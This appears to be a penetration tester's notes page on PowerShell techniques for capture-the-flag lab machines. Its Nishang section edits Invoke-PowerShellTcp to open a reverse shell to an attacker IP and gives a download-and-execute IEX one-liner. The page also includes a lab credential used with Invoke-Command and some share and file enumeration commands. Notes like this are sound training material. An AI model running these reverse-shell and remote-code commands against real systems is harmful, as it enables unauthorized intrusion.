---
description: >-
  Powershell Modules
title: Powershell Modules              # Add title here
date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Powershell Modules]                     # Change Templates to Writeup
tags: [file transfer, powershell modules]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Nishang
If we want to add a .ps1 file into a Windows machine such as the [Nishang](https://github.com/samratashok/nishang) series we can modify the latest line of such file (to load the script and then execute it):
```powershell
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 1234
```
Then we can execute it by using the following command on the compromised machine:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')
```
Examples:
[[Anubis#^bcdb9e]]

### Invoke-Command
Module to execute commands on the specified machine:
```powershell
PS> $Password = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
PS> $Creds = New-Object System.Management.Automation.PSCredential('timelapse.htb\svc_deploy', $Password)
*PS> Invoke-Command -ComputerName dc01 -Credential $Creds -ScriptBlock { whoami }
```
Examples:
[[Fulcrum#^0145f0]]

### Get-SMBShare
Retrieves the local shares:
```powershell
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC
```
Examples:
[[Fulcrum#^cae2ef]]

### Select-String
Search files on the system
```powershell
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern Administrator
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a
```
Example:
[[Fulcrum#^08db04]]
### AD CS
TODO
[[Anubis]]

### Invoke-PowerShellTCP
In order to connect to get a reverse shell with powershell we can abuse of the [Invoke-PowerShellTCP.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) all we need to do is modify the very bottom of this .ps1 file as follows:
```powershell
# Invoke-PowerShellTCP.ps1
------------------------SNIP---------------------------
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 443 -Rows 37 -Cols 189
```
> To get the file in rows and columns of the screen we can execute the stty size on our attacker machine.
{: .prompt-info }

> Don't forget to open your listener with netcat locally.
{: .prompt-tip }
Examples:
[Streamio](https://shuciran.github.io/posts/Streamio/#fnref:invoke-powershelltcp-ps1)
[[Anubis]]

